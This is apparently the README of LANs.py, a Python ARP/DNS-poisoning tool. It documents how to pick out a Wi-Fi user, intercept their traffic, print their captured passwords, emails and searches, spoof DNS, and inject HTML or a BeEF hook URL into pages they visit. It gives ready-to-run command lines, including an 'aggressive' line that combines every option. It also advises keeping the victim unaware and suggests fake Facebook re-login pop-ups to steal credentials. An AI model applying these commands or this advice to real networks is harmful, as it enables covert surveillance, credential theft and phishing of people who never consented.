LANs.py
========

Automatically find the most active WLAN users then spy on one of them and/or inject arbitrary HTML/JS into pages they visit. Technically: multithreaded asynchronous packet parsing/injecting ARP/DNS poisoner.

Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.


Prereqs: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), and a wireless card capable of promiscuous mode if you choose not to use the -ip option

Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.


All options:

``` shell
python LANs.py [-a] [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
  [-v] [-dns DNSSPOOF] [-r IPADDRESS] [-set] [-p] [-na] [-n] [-i INTERFACE] 
  [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
```

Usage
-----

### Simplest usage (including active user targeting):

``` shell
python LANs.py
```

Because there's no -ip option this will ARP scan the network, compare it to a live running promiscuous capture, and list all the clients on the network including their Windows netbios names along with how many data packets they're sending so you can immediately target the active ones. The ability to capture data packets they send is very dependent on physical proximity and the power of your network card. then you can Ctrl-C and pick your target which it will then ARP spoof. Simple target identification and ARP spoofing.

### Passive harvesting:

``` shell
python LANs.py -u -d -p -ip 192.168.0.10
```

-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting

-d: open an xterm with driftnet to see all images they view

-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received; will also decode base64 if the email authentication is encrypted with it

-ip: target this IP address

Easy to remember and will probably be the most common usage of the script: options u, d, p, like udp/tcp.


### HTML injection:

``` shell
python LANs.py -b http://192.168.0.5:3000/hook.js
```

Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits.


``` shell
python LANs.py -c '<title>Owned.</title>'
```

Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` and failing that injects prior to the first `</head>`. This example will change the page title to 'Owned.'


### Read from pcap:

``` shell
python LANs.py -pcap libpcapfilename -ip 192.168.0.10
```

To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script.


### DNS spoofing
``` shell
python LANs.py -a -r 80.87.128.67
```
``` shell
python LANs.py -dns eff.org
```
Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjuction with -r it will redirect them to -r's argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.  
Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.

### Most aggressive usage:

``` shell
python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
```


### All options:

``` shell
python LANs.py -h
```

-b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js

-c 'HTML CODE': inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject

-d: open an xterm with driftnet to see all images they view

-dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com

-a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this

-r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN

-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting

-i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0

-ip: target this IP address

-n: performs a quick nmap scan of the target

-na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt

-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received

-pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument

-rmac ROUTER_MAC: enter router MAC here if you're having trouble getting the script to automatically fetch it

-rip ROUTER_IP: enter router IP here if you're having trouble getting the script to automatically fetch it

-v: show verbose URLs which do not truncate at 150 characters like -u



### Clean up

Upon receiving a Ctrl-C:

-Turns off IP forwarding

-Flushes iptables firewall

-Individually restores the router and victim's ARP tables



Technical details
------------------

This script uses a python nfqueue-bindings queue wrapped in a Twisted IReadDescriptor to feed packets to callback functions. nfqueue-bindings is used to drop and forward certain packets. Python's scapy library does the work to parse and inject packets.

Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just wait for them to browse a few other pages. The goal is to be unnoticeable. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.

NOTE TO UBUNTU USERS: you will need to update/manually install nfqueue-bindings to version 0.4.3 due to the fact the version in Ubuntu's repo is 0.2. Alternatively just edit the Parser.start() function from:

def start(self, payload):

to:

def start(self, i, payload)



License
-------

Copyright (c) 2013, Dan McInerney
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
* Neither the name of Dan McInerney nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


-------
danmcinerney.org
[![Analytics](https://ga-beacon.appspot.com/UA-46613304-2/LANs.py/README.md)](https://github.com/igrigorik/ga-beacon)
